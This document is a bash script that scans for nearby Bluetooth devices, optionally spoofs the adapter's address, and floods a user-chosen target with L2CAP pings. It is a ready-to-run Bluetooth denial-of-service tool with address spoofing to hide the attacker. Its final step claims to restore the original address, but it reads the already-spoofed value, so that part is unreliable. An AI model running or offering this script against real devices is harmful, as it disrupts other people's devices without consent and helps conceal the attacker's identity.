#!/bin/bash

set -e

# Error Handling
error_exit() {
    echo "[!] Error: Command failed. Exiting script."
    exit 1
}
trap error_exit ERR

# Ensure Bluetooth Interface Exists
if ! hciconfig hci0 > /dev/null 2>&1; then
    echo "[!] Error: Bluetooth interface hci0 not found."
    exit 1
fi

# Activate Bluetooth Interface
sudo hciconfig hci0 up
sudo hciconfig hci0 piscan

# Function to Validate MAC Address
validate_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

# Option to Spoof MAC Address
read -p "Do you want to spoof your MAC address? (y/n): " spoof_choice
if [[ "$spoof_choice" == "y" ]]; then
    read -p "Enter a new MAC address (or press Enter to randomize): " new_mac

    if [[ -z "$new_mac" ]]; then
        # Generate Random MAC Address
        new_mac=$(printf '02:%02x:%02x:%02x:%02x:%02x\n' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        echo "[+] Randomized MAC address: $new_mac"
    elif ! validate_mac "$new_mac"; then
        echo "[!] Invalid MAC address format. Exiting."
        exit 1
    fi

    # Change MAC Address
    sudo hciconfig hci0 down
    sudo bdaddr -i hci0 $new_mac
    sudo hciconfig hci0 up
    echo "[+] MAC address changed to: $new_mac"
fi

# Bluetooth Device Scanning
echo "[+] Scanning for Bluetooth devices. Press Enter to stop..."
log_file="bluetooth_scan.log"
> "$log_file"

(
    while true; do
        sudo hcitool scan | tee -a "$log_file" &
        SCAN_PID=$!
        read -t 1 -r && kill "$SCAN_PID" && break
        wait "$SCAN_PID"
    done
)

# Display Found Devices
echo "[+] Scan complete. Devices found:" && cat "$log_file"

# Target MAC Address Input
read -p "Enter the MAC address of the device you want to target: " target_mac

if ! validate_mac "$target_mac"; then
    echo "[!] Invalid MAC address format. Exiting."
    exit 1
fi

# Ping Target Device
echo "[+] Sending L2CAP pings to $target_mac..."
sudo l2ping -i hci0 -f "$target_mac"

# Reset MAC Address (Optional)
if [[ "$spoof_choice" == "y" ]]; then
    sudo hciconfig hci0 down
    sudo bdaddr -i hci0 `cat /sys/class/bluetooth/hci0/address`
    sudo hciconfig hci0 up
    echo "[+] Restored original MAC address."
fi

echo "[+] Script completed successfully."
